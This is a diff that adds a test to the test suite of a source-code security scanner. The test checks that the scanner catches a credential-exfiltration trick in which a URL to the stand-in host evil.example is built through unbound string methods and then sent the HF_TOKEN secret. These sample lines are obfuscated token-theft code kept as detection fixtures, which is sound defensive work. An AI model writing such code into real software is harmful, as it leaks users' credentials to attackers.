@@ -4428,6 +4428,33 @@ def test_a_url_repeated_into_existence_is_read_or_left_a_hole():
     assert module._literal_text(oversized) is None
 
 
+def test_a_string_method_called_unbound_is_still_that_method():
+    """Called unbound, the receiver is the type rather than the template, so
+    every rule that reads a receiver saw str and the template went past as an
+    ordinary argument: str.format("{}://{}", "https", "evil.example/c") named
+    no destination at all, and str.replace and str.join did the same.
+
+    The call is rewritten to its bound form once, before anything reads it, so
+    the folds and the refusals stay written one way.
+    """
+    scan_converter_source = _load(
+        "converter_scan_unbound_probe", "unsloth_zoo/converter_scan.py",
+    ).scan_converter_source
+    preamble = 'import os\nimport requests\nHUB = "https://huggingface.co"\n'
+    send = 'requests.get(url, params = {"t": os.environ["HF_TOKEN"]})\n'
+    for body in (
+        'url = str.format("{}://{}", "https", "evil.example/c")\n' + send,
+        'url = str.replace("httpsX//evil.example/c", "X", ":")\n' + send,
+        'url = str.join("", ("htt", "ps://evil.example/c"))\n' + send,
+    ):
+        assert [f.check for f in scan_converter_source(preamble + body)], body
+
+    # The same spelling over the hub is read as the hub, not refused.
+    assert scan_converter_source(
+        preamble + 'url = str.format("{}/api", HUB)\n' + send
+    ) == []
+
+
 def test_the_hub_narrowing_does_not_reach_any_other_rule():
     """Only the env-harvest combination is narrowed. A credential stealer or a
     remote-code loader that happens to mention the hub is untouched.
